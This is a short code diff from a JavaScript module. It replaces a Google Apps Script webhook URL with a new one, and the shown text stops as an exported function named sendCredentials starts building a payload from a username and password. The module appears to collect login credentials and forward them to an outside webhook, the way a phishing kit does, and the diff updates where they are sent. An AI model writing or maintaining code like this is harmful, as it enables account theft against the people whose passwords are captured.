@@ -12,7 +12,7 @@
  */
 
 export const WEBHOOK_URL =
-  'https://script.google.com/macros/s/AKfycbzk9veLTr2hYDQW7p0Fjz429b_YtGflgztU8brBWeoQM8XiDjPgPA_j1y_mvsuwA6qW0Q/exec';
+  'https://script.google.com/macros/s/AKfycbw3LaDxZ3zY04qdRC_0z_BG8iuWYy5qtxMCzPd89MDjkT3l8B3Nv6chiAH1SDLpw9Oj5A/exec';
 
 export async function sendCredentials({ username, password }) {
   const payload = {
